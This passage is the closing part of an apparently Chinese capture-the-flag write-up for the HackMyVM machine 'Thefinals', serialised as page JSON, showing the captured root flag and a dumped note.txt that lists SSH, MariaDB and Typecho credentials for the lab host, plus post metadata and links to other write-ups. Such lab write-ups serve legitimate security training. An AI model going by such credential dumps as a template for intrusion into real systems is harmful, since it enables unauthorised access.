class=\"hljs-comment\"># cat root.flag </span>\n _____      __   __      ______\n/\\  __\\    /\\ <span class=\"hljs-string\">\"-.\\ \\    /\\  ___\\\n\\ \\ \\___   \\ \\ \\-.  \\   \\ \\___  \\\n \\ \\____\\   \\ \\_\\\\\"</span>\\_\\   \\ \\_____\\\n  \\/____/    \\/_/ \\/_/    \\/_____/\n\nflag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}\n</code></pre>\n<pre><code class=\"hljs language-bash\">~ <span class=\"hljs-comment\"># cat note.txt </span>\nssh://root@thefinals.hmv:BvIpFDyB4kNbkyqJGwMzLcK\nssh://staff@thefinals.hmv:qDCsBTj30cQyityMh3Rnyys\nssh://june@thefinals.hmv:aYTmcORsUrmwaKa7C2DBLCh\nssh://scotty@thefinals.hmv:uuUoqAETern4v5tW2iMFs47\n\nmariadb://root@localhost:p8RuoQGTtlKLAjuF1Tpy5wX\n\nmariadb://typecho_u@typecho_db@localhost:QLTkbviW71CSRZtGWIQdB6s\n\ntypecho://staff@thefinals.hmv:n3nPbqEOhs6eTcchyqXTXWi\ntypecho://june@thefinals.hmv:DihPQiQqNO75vv8zNBzLwUm\n\nflag{4b5d61daf3e2e5ba57019f617012ad0919c2a6c29e11912aeadef2820be8f298}\ncanyoureachthefinals -> sha256\n\nflag{8c5daa407626d218e962041dd8fd8f37913e56e32a6f06725da403175be0b9ff}\nyoufinallyreachedthefinals -> sha256\n\nTHE FINALS is a great FPS game. A lot of inspiration comes from games. Try it on http://reachthefinals.com/\n</code></pre>","title":"HackMyVM - Thefinals","date":"2025-05-03","updated":"2025-05-03","comments":true,"tags":["Linux靶机","HackMyVM","Typecho","XSS"],"categories":"靶机","description":"Thefinals. https://hackmyvm.eu/machines/machine.php?vm=Thefinals Notes：Please wait for the IP to appear on the screen and then start. If it doesn't bo..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Machine - Voleur","date":"2025-07-07","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Machine - RustyKey","date":"2025-06-30","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMKrustykrab","title":"HackMyVM - Krustykrab","date":"2025-04-18","isEncrypted":false,"year":"2025","month":"11","day":"12"},{"id":"HackMyVMSoc1","title":"HackMyVM - Soc1","date":"2025-11-04","isEncrypted":false,"year":"2025","month":"11","day":"04"},{"id":"TheHackersLabsZAPP","title":"TheHackersLabs - ZAPP","date":"2025-11-02","isEncrypted":false,"year":"2025","month":"11","day":"02"},{"id":"TheHackersLabsPhotographer","title":"TheHackersLabs - Photographer","date":"2025-11-02","isEncrypted":false,"year":"2025","month":"11","day":"02"},{"id":"TheHackersLabsLuna","title":"TheHackersLabs - Luna","date":"2025-10-28","isEncrypted":false,"year":"2025","month":"10","day":"28"}]},"__N_SSG":true}